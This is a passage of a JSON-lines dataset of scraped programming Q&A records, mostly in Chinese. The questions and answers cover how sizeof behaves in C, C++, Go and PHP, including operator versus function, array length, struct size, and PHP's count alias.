["严格地说C语言中的sizeof是函数吗？", ["今天上课C语言teacher说了个 “sizeof”函数，我觉得严格地说他不是函数吧，只是和函数差不多功能很像。我还直接说了sizeof不是函数，teacher不理我，搞的我很尴尬。@", "GX", " "]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Writing microbenchmarks is hard. &lt;em&gt;Really&lt;/em&gt; hard.&lt;/p&gt;\n\n&lt;p&gt;Getting reliable, repeatable, statistically significant, statistically sound results from a microbenchmark requires an advanced level of understanding of statistics, an advanced level of understanding of all the possible implementations and their possible optimizations (and ideally even not-yet-existing implementations and future optimizations), an advanced level of understanding of the code involved, and lots of experience writing microbenchmarks. People who write benchmarks are typically specialized professionals who do nothing but write benchmarks all day, every day for years. And even then, they get it wrong. IIRC, there was a famous case of a SPEC benchmark (pretty much &lt;em&gt;the&lt;/em&gt; organization specializing in benchmarking) which was supposed to test the performance of database drivers but actually ended up testing memory allocator performance.&lt;/p&gt;\n\n&lt;p&gt;And even &lt;em&gt;if&lt;/em&gt; you manage to write a reliable, repeatable, statistically significant, statistically sound microbenchmark, you will end up with perfectly reliable, perfectly repeatable, statistically significant, statistically sound results which are also perfectly useless, because microbenchmarks pretty much by &lt;em&gt;definition&lt;/em&gt; don't reflect your actual real-world use case, loads, and environment.&lt;/p&gt;\n\n&lt;p&gt;All that to say: There cannot possibly be any performance difference. The only way a benchmark can possibly claim otherwise is if the benchmark is broken. Aliases are literally implemented as two names for the same code; it does not matter which name you use.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么在PHP中使用sizeof更快地缓存for循环中的缓存长度", ["\n\n", "In this post a user calculated the performance of ", "sizeof", " vs. ", "count", ".", "\n\n", "Turns out its faster (although less readable) to use ", "sizeof", " to cache the length of the array instead of ", "count", ".", "\n\n", "It doesn't really make sense to me because sizeof is just an alias to count and, at least in my mind, it produces at least 1 additional machine call (since it resolves to count...).", "\n\n", "Am I missing something critical here or is it actually slower but the calculation is wrong? ", "\n\n", "Is this behavior dependend on an opcode cache?", "\n\n", "Here is the thread: ", "https://stackoverflow.com/a/23410780/1268652", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;According to my benchmarking &lt;code&gt;sizeof()&lt;/code&gt; and &lt;code&gt;count()&lt;/code&gt; perform about the same, however to squeeze more performance out of the loop itself you can do the following:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;for($i=0, $c=sizeof($unset);$i&amp;lt;$c;$i++){\n  $v=$v+1;\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;This should give it a performance boost because it doesn't have to evaluate with a function in each loop cycle.&lt;/p&gt;\n\n&lt;p&gt;The system I've used is &lt;a href=\"https://github.com/Xorifelse/php-benchmark-closure\" rel=\"nofollow noreferrer\"&gt;here&lt;/a&gt; with the following code:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$b = new \\Benchmark(10000);\n\n$b-&amp;gt;register('sizeof', function(){\n  $unset=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o');\n  for($i=0;$i&amp;lt;sizeof($unset);$i++) {$v=$v+1;}\n});\n\n$b-&amp;gt;register('count', function(){\n  $unset=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o');\n  for($i=0;$i&amp;lt;count($unset);$i++) {$v=$v+1;}\n});\n\n$b-&amp;gt;register('count 2', function(){\n  $unset=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o');\n  for($i=0, $c=count($unset);$i&amp;lt;$c;$i++) {$v=$v+1;}\n});\n\n$b-&amp;gt;register('preset', function(){\n  $unset=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o');\n  for($i=0;$i&amp;lt;15;$i++) {$v=$v+1;}\n});\n\nprint_r($b-&amp;gt;start());\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;With this as the results:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;Array\n(\n    [stats] =&amp;gt; Array\n        (\n            [phpversion] =&amp;gt; 7.1.1\n            [itterations] =&amp;gt; 40000\n            [duration] =&amp;gt; 0.1180682182\n            [fastest] =&amp;gt; preset\n            [slowest] =&amp;gt; sizeof\n        )\n\n    [results] =&amp;gt; Array\n        (\n            [0] =&amp;gt; Array\n                (\n                    [name] =&amp;gt; preset\n                    [time] =&amp;gt; 0.0265829563\n                    [average] =&amp;gt; 0.0000026583\n                    [speed] =&amp;gt; 19.73%\n                )\n\n            [1] =&amp;gt; Array\n                (\n                    [name] =&amp;gt; count 2\n                    [time] =&amp;gt; 0.0271441936\n                    [average] =&amp;gt; 0.0000027144\n                    [speed] =&amp;gt; 18.04%\n                )\n\n            [2] =&amp;gt; Array\n                (\n                    [name] =&amp;gt; count\n                    [time] =&amp;gt; 0.0312242508\n                    [average] =&amp;gt; 0.0000031224\n                    [speed] =&amp;gt; 5.71%\n                )\n\n            [3] =&amp;gt; Array\n                (\n                    [name] =&amp;gt; sizeof\n                    [time] =&amp;gt; 0.0331168175\n                    [average] =&amp;gt; 0.0000033117\n                    [speed] =&amp;gt; 0.00%\n                )\n\n        )\n\n)\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["循环sizeof（$ x）与循环（$ x）的实际速度/基准？", ["\n\n", "I'm confused about the speed of the sizeof($x) vs $x when in a loop. This site: phpbench.com claims that the loop of sizeof($x) without pre calc -count() is ", "THOUSANDS", " of percent slower than with pre calc count(). So I did a test as below, but I'm not sure if this is the right way to test it. The results show that the time is almost the same for each function. So I don't understand how it would be so much different from the phpbench website.", "\n\n", "In summary, I'd like to know a definite answer if function a (with sizeof($unset)) is really considerably slower than function b (with pre calculated $unset value). I think now the values/functions are stored in memory so sizeof($x) could actually be faster than on servers from several years ago?", "\n\n", "<?php\n\n$v=0;\n\nfunction a()\n{\n//sizeof\n$unset=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o');\n\nfor($i=0;$i<sizeof($unset);$i++) {$v=$v+1;}\n\nreturn;\n}\n\nfunction b()\n{\n//pre calculated\n$unset=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o');\n\nfor($i=0;$i<15;$i++) {$v=$v+1;}\n\nreturn;\n}\n\nfunction benchmark($func)\n{\n\n    $start = microtime(true);\n    for ($i = 0; $i < 500000; $i++) {\n        $func();\n    }\n    $end = microtime(true);\n    $time = $end - $start;\n\n    echo $func . \" time: \" . sprintf('%.4f', $time) . PHP_EOL.'<br>';\n}\n\nbenchmark('a'); // sizeof\nbenchmark('b'); // count\n\n?>\n", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;函数里Student cls[] &amp;#61; {&lt;!-- --&gt;&lt;br /&gt;{&amp;#34;张三&amp;#34;, 1001, 16, &amp;#39;A&amp;#39;, 95.50},&lt;br /&gt;{&amp;#34;李四&amp;#34;, 1002, 15, &amp;#39;A&amp;#39;, 90.00},&lt;br /&gt;{&amp;#34;王五&amp;#34;, 1003, 16, &amp;#39;B&amp;#39;, 80.50}&lt;br /&gt;};     定义一个结构体并初始化&lt;br /&gt;num_stu &amp;#61; sizeof(cls) / sizeof(Student);    用来判断有多少名学生·&lt;br /&gt;i &amp;lt; num_stu   是用于for循环遍历学生成绩&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于结构体和sizeof()的运用解释", ["#include <stdio.h>", "\n", "typedef struct", "{", "    char *name;", "    int id;", "    unsigned int age;", "    char group;", "    float score;", "} Student;", "\n", "void print_students(Student stu)", "{", "    printf(\"%s\\t%d\\t%d\\t%c\\t%.2f\\n\",", "        stu.name, stu.id, stu.age, stu.group, stu.score);", "}", "\n", "int main(int argc, char** argv)", "{", "    Student cls[] = {", "        {\"张三\", 1001, 16, 'A', 95.50},", "        {\"李四\", 1002, 15, 'A', 90.00},", "        {\"王五\", 1003, 16, 'B', 80.50}", "    };", "\n", "size_t i, num_stu = sizeof(cls) / sizeof(Student);\n", "float", " total = ", "0", ", average = ", "0", ";\nprintf(", "\"=============== 学生基本信息 ===============", "\\n", "\"", ");\nprintf(", "\"姓名", "\\t", "学号", "\\t", "年龄", "\\t", "小组", "\\t", "成绩", "\\n", "\"", ");\nprintf(", "\"--------------------------------------------", "\\n", "\"", ");\nfor (i = ", "0", "; i < num_stu; ++i) {\n    print_students(cls[i]);\n    total += cls[i].score;\n}\nprintf(", "\"============================================", "\\n", "\"", ");\naverage = total / num_stu;\nprintf(", "\"班级平均成绩：%.2f\"", ", average);\n\nreturn ", "0", ";\n", "\n", "}", "\n", "函数里Student cls[] = {", "        {\"张三\", 1001, 16, 'A', 95.50},", "        {\"李四\", 1002, 15, 'A', 90.00},", "        {\"王五\", 1003, 16, 'B', 80.50}", "    };是什么意思？", "\n", "num_stu = sizeof(cls) / sizeof(Student);", " i < num_stu；", "这个判断的是什么？，有什么作用吗？"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Because in Go if you need to call sizeof, it generally means you're manipulating memory directly, and you should never need to do that.&lt;/p&gt;\n\n&lt;p&gt;If you come from the C world, you'll probably most often have used &lt;code&gt;sizeof&lt;/code&gt; together with &lt;code&gt;malloc&lt;/code&gt; to create a variable-length array - but this should not be needed in Go, where you can simply &lt;code&gt;make([]Foo, 10)&lt;/code&gt;. In Go, the amount of memory to be allocated is taken care of by the runtime.&lt;/p&gt;\n\n&lt;p&gt;You should not be afraid of calling &lt;code&gt;unsafe.Sizeof&lt;/code&gt; where it really makes sense - but you should ask yourself whether you actually need it.&lt;/p&gt;\n\n&lt;p&gt;Even if you're using it for, say, writing a binary format, it's generally a good idea to calculate by yourself the number of bytes you need, or if anything generate it dynamically using &lt;code&gt;reflect&lt;/code&gt;:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;calling &lt;code&gt;unsafe.Sizeof&lt;/code&gt; on a struct will also include the number of bytes added in for &lt;a href=\"https://dave.cheney.net/2015/10/09/padding-is-hard\" rel=\"noreferrer\"&gt;padding&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;calling it on dynamically-sized structures (ie. slices, strings) will yield the length of their headers - you should call &lt;code&gt;len()&lt;/code&gt; instead.&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Using &lt;code&gt;unsafe&lt;/code&gt; on a &lt;code&gt;uintptr&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt; or &lt;code&gt;uint&lt;/code&gt; to determine whether you're running on 32-bit or 64-bit? You can generally avoid that by specifying &lt;code&gt;int64&lt;/code&gt; where you actually need to support numbers bigger than 2^31. Or, if you really need to detect that, you have many other options, such as build tags or something like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;package main\n\nimport (\n    \"fmt\"\n)\n\nconst is32bit = ^uint(0) == (1 &amp;lt;&amp;lt; 32) - 1\n\nfunc main() {\n    fmt.Println(is32bit)\n}\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么不安全。Sizeof被认为不安全？", ["\n\n", "Consider the following:", "\n\n", "import (\n    \"log\"\n    \"unsafe\"\n)\n\ntype Foo struct {\n    Bar int32\n}\n\nfunc main() {\n    log.Println(int(unsafe.Sizeof(Foo{})))\n}\n", "\n\n", "Why is determining the size of a variable considered unsafe, and a part of the unsafe package? I don't understand why obtaining the size of any type is an unsafe operation, or what mechanism go uses to determine its size that necessitates this. ", "\n\n", "I would also love to know if there are any alternatives to the unsafe package for determining size of a known struct.", "\n    "]], "Tag": "程序设计"}
{"Answer": "因为strlen并不理会数组越界，它就是从指针当前位置开始往后搜索\\\\0并且计数。就是这么简单粗暴。\r\n\r\nsizeof(数组)，这虽然看上去似乎是一个函数，但是要记住，sizeof不是函数，是运算符。运算符和函数的区别在于，它并不是在程序运行的过程中执行的，而是编译的时候就求值的。编译器知道你数组的长度，并且转换为一个整数，填写在 sizeof 的位置。\r\n\r\n实际上，在运行的时候，C语言根本没有数组长度这个概念。你没有办法传入一个数组给一个函数，让这个函数去计算这个数组的长度，这也是为什么strlen会越界的原因，它根本不知道什么时候结束。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言字符串问题，关于strlen与sizeof", ["先看一下源代码", "\n\n", "#include <stdio.h>\n#include <string.h>\n#define PRAISE \"What a super marvelous name!\"\nint main(void)\n{\n     char name [40];\n     printf(\"What is your name ?\\n\");\n     scanf(\"%s\",name);\n     printf(\"Hello %s. %s\\n\",name,PRAISE );\n     printf(\"Your name of %d letters occupies %d memory cells.\\n\",\n     strlen(name),sizeof(name));\n     printf(\"The phrase of praise has %d letters \",strlen (PRAISE));\n     printf(\"and occupies %d memory cells.\\n\",sizeof PRAISE);\n     return 0;\n} \n", "\n\n", "下面是运行情况", "\n问题是为什么输入的字符超过了 name的数组长度，而strlen函数给出的是正确的字符数，而sizeof给的是数组原长度，而且超过数组的部分怎么还能被是strlen正确计数？大神求解。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;static变量是不属于类的。&lt;br /&gt;因此stu1的大小就是Student的大小&amp;#xff0c;Student的大小就是string的大小&amp;#xff0c;你可以输出sizeof(string)&amp;#xff0c;看看你的是不是40,&lt;br /&gt;32位系统sizeof(string)的值是28&lt;br /&gt;64位系统sizeof(string)的值是40&lt;/p&gt;\n&lt;p&gt;因为string内部是一个char*的指针还有int类型&amp;#xff0c;不同位数的编译器字节数自然不同&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;\nusing namespace std;\nclass Student\n{\npublic:\n    Student(string &lt;span class=\"hljs-built_in\"&gt;name&lt;/span&gt;);\n    ~Student();\n    static int &lt;span class=\"hljs-variable\"&gt;_sum&lt;/span&gt;;\n&lt;span class=\"hljs-keyword\"&gt;private&lt;/span&gt;:\n    string &lt;span class=\"hljs-variable\"&gt;_name&lt;/span&gt;;\n};\n&lt;span class=\"hljs-comment\"&gt;//类外实现Student类有参构造函数&lt;/span&gt;\nStudent::Student(string &lt;span class=\"hljs-built_in\"&gt;name&lt;/span&gt;)\n{\n    this-&amp;gt;&lt;span class=\"hljs-variable\"&gt;_name&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-built_in\"&gt;name&lt;/span&gt;;\n    &lt;span class=\"hljs-variable\"&gt;_sum&lt;/span&gt;&amp;#43;&amp;#43;;\n}\nStudent::~Student() {}\nint Student::&lt;span class=\"hljs-variable\"&gt;_sum&lt;/span&gt; &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;&lt;span class=\"hljs-comment\"&gt;//类外初始化静态成员变量_sum&lt;/span&gt;\nint main()\n{\n    Student stu1(&lt;span class=\"hljs-string\"&gt;&amp;#34;张三&amp;#34;&lt;/span&gt;);\n    Student stu2(&lt;span class=\"hljs-string\"&gt;&amp;#34;李四&amp;#34;&lt;/span&gt;);\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;人数是&amp;#xff1a;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; stu1.&lt;span class=\"hljs-variable\"&gt;_sum&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-literal\"&gt;endl&lt;/span&gt;;       &lt;span class=\"hljs-comment\"&gt;//通过对象访问静态成员变量&lt;/span&gt;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;人数是&amp;#xff1a;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; stu2.&lt;span class=\"hljs-variable\"&gt;_sum&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-literal\"&gt;endl&lt;/span&gt;;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;人数是&amp;#xff1a;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; Student::&lt;span class=\"hljs-variable\"&gt;_sum&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-literal\"&gt;endl&lt;/span&gt;;    &lt;span class=\"hljs-comment\"&gt;//通过类访问静态成员变量_sum&lt;/span&gt;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;stu1的大小是&amp;#xff1a;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(stu1) &amp;lt;&amp;lt; &lt;span class=\"hljs-literal\"&gt;endl&lt;/span&gt;;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;string的大小是&amp;#xff1a;&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(string) &amp;lt;&amp;lt; &lt;span class=\"hljs-literal\"&gt;endl&lt;/span&gt;;\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["stu1的sizeof到底是多少？", ["\n", "#", "include", "<iostream>", "\n", "using", " ", "namespace", " std;\n", "class", " ", "Student", "\n{\n", "public", ":\n    ", "Student", "(string name);\n    ~", "Student", "();\n     ", "static", " ", "int", " _sum;\n", "private", ":\n    string _name;\n};\n", "//类外实现Student类有参构造函数", "\nStudent::", "Student", "(string name)\n{\n    ", "this", "->_name = name;\n    _sum++;\n}\nStudent::~", "Student", "(){}\n", "int", " Student::_sum = ", "0", ";", "//类外初始化静态成员变量_sum", "\n", "int", " ", "main", "()", "\n", "{\n    ", "Student ", "stu1", "(", "\"张三\"", ")", ";\n    ", "Student ", "stu2", "(", "\"李四\"", ")", ";\n    cout << ", "\"人数是：\"", " << stu1._sum << endl;       ", "//通过对象访问静态成员变量", "\n    cout << ", "\"人数是：\"", " << stu2._sum << endl;\n    cout << ", "\"人数是：\"", " << Student::_sum<< endl;    ", "//通过类访问静态成员变量_sum", "\n    cout << ", "\"stu1的大小是：\"", " << ", "sizeof", "(stu1) << endl;\n    ", "return", " ", "0", ";\n}\n", "\n", "书上的结果是28，我运行的是40；", "课本是黑马的C++"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Based on PHP Documentation, sizeOf (alias of Count) returns 1 if the array is not countable .&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=\"http://php.net/manual/en/function.count.php\" rel=\"nofollow\"&gt;http://php.net/manual/en/function.count.php&lt;/a&gt;&lt;/p&gt;\n\n&lt;blockquote&gt;\n  &lt;p&gt;Returns the number of elements in array_or_countable. If the parameter\n  is not an array or not an object with implemented Countable interface,\n  1 will be returned. There is one exception, if array_or_countable is\n  NULL, 0 will be returned.&lt;/p&gt;\n&lt;/blockquote&gt;\n\n&lt;p&gt;But appart from that, on your second ECHO, you are displaying the sizeOff ot the result of a sizeoff , that would be a single number\npseudo:\na = count(\"a\",\"b\",\"c\")\na should be 3\nECHO count(a)\nECHO Display 1, as (a) is a single element&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["PHP sizeof（）返回1错误", ["\n\n", "This code worked last week, and I don't remember changing this code recently, but for some reason it stopped working today. ", "\n\n", "I've narrowed down the issue, but I'm confused about it. Basically, ", "$fields = sizeof($dataArray[$r]);", " yields ", "$fields = 1", ", but as you can see in the image below, ", "ECHO json_encode($dataArray);", " demonstrates that ", "$fields = 9", " should be observed.", "\n\n", "$dataArray = $_POST['array'];\n\n$validRows = array();\n$invalidRows = array();\n\necho sizeof($dataArray); // correct output\n\nfor($r = 0; $r < sizeof($dataArray); $r++){\n\n  $fields = sizeof($dataArray[$r]); // $fields is not what I expect\n\n  ECHO json_encode($dataArray); // see image below (sent to javaScript alert)\n  ECHO sizeof($fields); // returns 1\n\n  ...\n}\n", "\n\n", "ECHO json_encode($dataArray);", " Seen in a javaScript alert", "\n\n", "\n\n", "What's my issue here?", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你是对int a和int a[10]比吧?sizeof(a[])相当于计算数组首地址或者一个指针的大小&amp;#xff0c;就是int类型的大小。指针都占用一个int存储空间&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问在sizeof()里面，为什么sizeof(a)和sizeof(a[])是等价的", ["请问在sizeof()里面，为什么sizeof(a)和sizeof(a[])是等价的"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;1️⃣表达式sizeof(&amp;#34;\\nsum&amp;#61;%d\\n&amp;#34;)的值是多少&amp;#xff1f;&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;1&amp;#43;1&amp;#43;1&amp;#43;1&amp;#43;1&amp;#43;1&amp;#43;1&amp;#43;1&amp;#61;8       解释&amp;#xff1a; \\n s u m &amp;#61; % d \\n 一共八个字符 八个字节&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;8再加上字符串之后省略的&amp;#39;\\0&amp;#39;字符 一共8&amp;#43;1 也就是 9个字节&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;所以最后结果值为 9 个字节&lt;/strong&gt;&lt;/p&gt;\n&lt;hr /&gt;\n&lt;p&gt;&lt;strong&gt;2️⃣sizeof代表什么意思&amp;#xff1f;&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;在 C 语言中&amp;#xff0c;sizeof() 是一个判断数据类型或者表达式长度的运算符。&lt;/strong&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;希望对题主有所帮助&amp;#xff01;可以的话&amp;#xff0c;帮忙点个采纳&amp;#xff01;&lt;/strong&gt;&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof(\"\\nsum=%d\\n\")", ["表达式sizeof(\"\\nsum=%d\\n\")的值是多少", "\n", "sizeof代表什么意思？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof(10&amp;#43;&amp;#39;a&amp;#39;)的值为4&amp;#xff0c;sizeof()函数是获取某个数据类型所占用空间的字节数。这里要用到 ASCII码 和 数据类型中的自动类型转换 相关知识。&lt;br /&gt;10&amp;#43;&amp;#39;a&amp;#39;  是一个int类型 加 字符类型  &amp;#xff0c;在不同类型变量之间的混合运算中&amp;#xff0c;int &amp;#43; char &amp;#xff0c;char类型会先转换成int类型&amp;#xff0c;通过査 ASCII码可得 a对应的十进制数为 97 &amp;#xff0c;现在就变成了int &amp;#43; int &amp;#xff0c;这样就可以计算了&amp;#xff0c;得出结果 107 。此时就是sizeof(107)&amp;#xff0c;即int类型所占用的字节数&amp;#xff0c;结果为4&lt;br /&gt;代码可以运行下自己理解&amp;#xff0c;希望你能继续坚持学习&amp;#xff01;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;using&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;namespace&lt;/span&gt; std;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt; &lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; x;&lt;span class=\"hljs-comment\"&gt;//任意int类型&lt;/span&gt;\n    cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;任意int类型所占字节数:\\t&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(x)&amp;lt;&amp;lt;endl;\n    cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;a对应的ASCII码值:\\t&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&amp;lt;&amp;lt;endl;\n    cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;a对应97,97&amp;#43;10&amp;#61;107\\t&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;(&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;&amp;#43;&lt;span class=\"hljs-string\"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;)&amp;lt;&amp;lt;endl;\n    cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;sizeof(10&amp;#43;&amp;#39;a&amp;#39;)的值为:\\t&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;&amp;#43;&lt;span class=\"hljs-string\"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof（10+‘a’）的值是多少", ["sizeof（10+‘a’）的值是多少？具体是怎么算的呀？大一新生，学不会C++了怎么办🥹"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;I would use &lt;code&gt;count()&lt;/code&gt; if they are the same, as in my experience it is more common, and therefore will cause less developers reading your code to say \"&lt;code&gt;sizeof()&lt;/code&gt;, what is that?\" and having to consult the documentation.&lt;/p&gt;\n\n&lt;p&gt;I think it means &lt;code&gt;sizeof()&lt;/code&gt; does not work like it does in C (calculating the size of a datatype). It probably made this mention explicitly because PHP is written in C, and provides a lot of identically named wrappers for C functions (&lt;code&gt;strlen()&lt;/code&gt;, &lt;code&gt;printf()&lt;/code&gt;, etc)&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["PHP数组：count还是sizeof？", ["\n\n", "To find the number of elements in a PHP ", "$array", ", which is faster/better/stronger?", "\n\n", "count($array)", " or ", "sizeof($array)", " ?", "\n\n", "Edit", "\n\n", "Thanks to Andy Lester, I have refined my question to mean from a multilingual perspective.  The manual commenters say ", "\n\n", "\n  ", "\"[sizeof] does not mean the same in\n  many other languages based on C\"", "\n", "\n\n", "Is this true?", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;i从2到10&amp;#xff0c;循环9次&amp;#xff0c;每次jc*i&amp;#xff0c;也就是求10的阶乘&amp;#xff0c;因为jc自身&amp;#61;1&lt;/p&gt;\n\n&lt;p&gt;整体就是1*2*3*4*5*6*7*8*9*10&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["若sizeof(int)为2,计算1至10的乘积语序", ["怎么理解float jc=1；for(int i=2；i<=10;jc*=i,i=i+1）"]], "Tag": "程序设计"}
{"Answer": "int arr[]是int* arr,  &amp;arr+1 是在arr指针栈地址的基础上做了1的偏移, 也就是&amp;arr+1*_sizeof(int)后的地址, *(&amp;arr+1)的内容就未可知了.\r\nmysizeof函数可以做如下改下:\r\n\r\nint(\\*p)[7] = (int(*)[7])arr;\r\n\r\nint \\* pp1 = * (p+1) ;\r\n\r\nint pp2 = pp1 - (int*)p;\r\n\r\nreturn pp2;\r\n\r\n所以, 函数对数据的长度是必需的", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["不用SIZEOF求数组大小的问题", ["我在论坛上找到了不用sizeof求数组大小的方法，但是如果我将这个办法封装", "\n成函数，返回的数字完全是错的，不知道为什么，求仙人指路", "\n\n", "int mysizeof(int arr[]);\nint mysizeof(int arr[])\n{\n    int*pp1=*(&arr+1);\n    int pp2 = pp1-arr;\n    return pp2;\n}\n\nint main()\n{\n    int a[] = {1,2,3,4,5,6,7};\n    int * p = *(&a+1);\n    int p2 = p-a;\n    int pp = mysizeof(a);\n\n    printf(\"%p\\t%p\\t\\n\",a+1,p);\n    printf(\"%d\",p2);\n    printf(\"\\n********************************************\\n\");\n    printf(\"%d\",pp);\n    return 0;\n}\n", "\n\n", "为什么这个函数不能封装啊，自定义函数中的值到底发生了什么？", "\n在线等", "\n但是同样的写法在main里为什么能够正确计算？是不是因为传递进函数之后arr是一个副本，在main中的时候&arr的类型是具有长度属性的，+1之后就移动了整个数组的长度，但是在自定义函数中arr只是一个指向main函数中数组首元素的地址的一个指针，而不具备长度属性，或者说长度属性退化掉了？所以在自定义函数中&arr+1不能明确知道指针具体偏移了多少，是这个意思吗？还是不太明白"]], "Tag": "程序设计"}
